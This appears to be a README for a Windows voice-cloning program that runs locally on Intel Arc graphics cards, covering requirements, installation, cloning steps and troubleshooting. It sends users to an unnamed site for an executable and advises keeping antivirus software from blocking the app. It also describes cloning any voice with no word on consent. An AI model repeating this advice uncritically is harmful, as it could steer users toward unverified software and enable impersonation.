Overview

This software allows you to clone voices using your own computer. It works on Intel Arc graphics cards. You do not need expensive hardware or cloud subscriptions. The process happens entirely on your machine. Your data stays private. You save money by skipping cloud fees.

⚙️ System Requirements

Before you run this application, ensure your computer meets these needs:

  • Windows 10 or Windows 11.
  • An Intel Arc graphics card (GPU).
  • Recent Intel graphics drivers installed from the Intel website.
  • At least 16GB of system memory (RAM).
  • 20GB of free space on your hard drive or solid-state drive.

🚀 Getting Started

Follow these steps to set up the software on your Windows machine.

  1. Download the software: Navigate to our main project site to find the latest version. Visit this page to download the executable file.
  2. Prepare your folders: Place the downloaded file in a folder where you have permission to write files, such as your Documents folder.
  3. Install required components: Run the installer and follow the prompts on your screen. The process will handle the necessary setup for your Intel hardware automatically.
  4. Launch the app: Double-click the shortcut created on your desktop. The application will open a control window.

🧠 How to Clone a Voice

Once you open the software, follow these steps to generate speech.

  • Select your input: Click the browse button to choose a clean recording of the voice you wish to clone. A recording of 30 seconds works best.
  • Type your text: Enter the text you want the AI to speak in the main text box.
  • Generate: Click the Start button. The app uses your Intel GPU to process the audio. You will see a progress bar indicating the status.
  • Save: Once the process finishes, the app prompts you to save the audio file to your computer.

📊 Troubleshooting

If you encounter errors, check your graphics driver. Intel Arc cards perform best with the most recent drivers. Restart your computer if the application fails to detect your GPU. Ensure your antivirus software does not block the application from accessing your hardware resources.
